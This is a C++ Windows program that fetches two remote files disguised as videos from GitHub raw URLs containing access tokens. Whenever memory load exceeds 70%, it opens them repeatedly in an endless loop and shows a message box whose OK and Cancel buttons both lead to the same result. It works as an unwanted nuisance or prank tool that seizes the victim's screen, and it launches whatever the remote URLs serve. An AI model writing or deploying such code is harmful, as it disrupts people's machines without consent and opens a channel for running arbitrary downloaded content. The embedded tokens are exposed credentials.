#include<windows.h>
#include<cstdint>
#include<stdio.h>

// For URLDownloadToFile
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

// For filesystem operations
#include<filesystem>
//#include<fstream>L

#define N3ass Sleep(30000)
#define Url L"https://raw.githubusercontent.com/0x000b/veds/refs/heads/main/video0.mp4?token=GHSAT0AAAAAADI5ZEUY2GWFQQIUVQ4DLOYM2HREILA"
#define Url2 L"https://raw.githubusercontent.com/0x000b/veds/refs/heads/main/8b81cdbc-8eff-4311-8c92-e6ba97b59399.mov?token=GHSAT0AAAAAADI5ZEUYHYMPGGSNSMCT4JZQ2HREG2A"
#define WIDTH 7 // For formatting output
#define DIV 1024 // To convert bytes to KB
//#define MAX_PATH 1024 // Maximum path length



void DownloadFile1(void)
{
	WCHAR   theBlobURL[] = Url;
	WCHAR   outfilename[] = L"downloaded_file.mp4";
	HRESULT hr = URLDownloadToFile(NULL, theBlobURL, outfilename, 0, NULL);
};

void DownloadFile2(void)
{
	WCHAR   theBlobURL[] = Url2;
	WCHAR   outfilename[] = L"downloaded_file1.mp4";
	HRESULT hr = URLDownloadToFile(NULL, theBlobURL, outfilename, 0, NULL);
}

void OpenFile2(void) {
	ShellExecuteA(0, (LPSTR)"open", (LPSTR)"downloaded_file1.mp4", 0, 0, SW_SHOWNORMAL);
};

void OpenFile(void) {
	ShellExecuteA(0, (LPSTR)"open", (LPSTR)"downloaded_file.mp4", 0, 0, SW_SHOWNORMAL);

};


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	
	
	MEMORYSTATUSEX statex;
	
	statex.dwLength = sizeof(statex);	
	WCHAR filename[] = L"downloaded_file.mp4";
	DownloadFile1();
	DownloadFile2();

	while (true) {
		GlobalMemoryStatusEx(&statex);
		if (statex.dwMemoryLoad > 70 ) {
			if (std::filesystem::exists(L"downloaded_file.mp4") && std::filesystem::exists(L"downloaded_file1.mp4"))
			{
				OpenFile();
				Sleep(5000);
				int result =	MessageBox(NULL, L"Baghi tkhroj ?? ", L"KOBLIAL7ALOBAN",  MB_OKCANCEL | MB_ICONSTOP );
				if (result == IDOK) OpenFile2();
				else OpenFile2() ;
				N3ass;	
			}
			else {
				//MessageBox(NULL, L"Files not found, downloading...", L"KOBLIAL7ALOBAN", MB_OK | MB_ICONWARNING);
				DownloadFile1();
				DownloadFile2();
				OpenFile();
				OpenFile2();
				N3ass;
			}; 
		}
		else {
			Sleep(10000); // Sleep for 3 seconds
		}
	};
	

	return 0;
}